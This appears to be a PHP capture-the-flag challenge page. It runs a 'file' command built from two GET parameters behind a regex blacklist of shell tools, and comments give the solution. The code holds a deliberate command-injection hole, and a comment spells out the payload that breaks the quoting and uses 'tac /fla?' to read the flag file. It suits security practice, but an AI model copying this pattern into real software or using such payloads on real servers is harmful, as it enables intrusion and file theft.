<?php

    highlight_file(__FILE__);

    // ?comm1=index.php";tac /fla?;"&comm2
    $comm1 = $_GET['comm1'];
    $comm2 = $_GET['comm2'];


    if (preg_match("/\'|\`|\\|\*|\n|\t|\xA0|\r|\{|\}|\(|\)|<|\&[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is", $comm1))
        $comm1 = "";
    if (preg_match("/\'|\"|;|,|\`|\*|\\|\n|\t|\r|\xA0|\{|\}|\(|\)|<|\&[^\d]|@|\||ls|\||tail|more|cat|string|bin|less||tac|sh|flag|find|grep|echo|w/is", $comm2))
        $comm2 = "";

    $flag = "#flag in /flag";

    // 给传入的参数添加双引号
    $comm1 = '"' . $comm1 . '"';
    $comm2 = '"' . $comm2 . '"';

    // "file index.php";tac /fla?;""""
    $cmd = "file $comm1 $comm2";
    system($cmd);
?>
cannot open `' (No such file or directory) cannot open `' (No such file or directory)

<!-- 解题方法：使用linux中的tac命令 -->
<!-- 
    tac命令是cat命令的反转 
        因为cat命令是正向读取文件，从第一行开始，从上往下顺序输出数据
        tac就是反向输出数据反向，从最后一行开始，从下往上输出数据
-->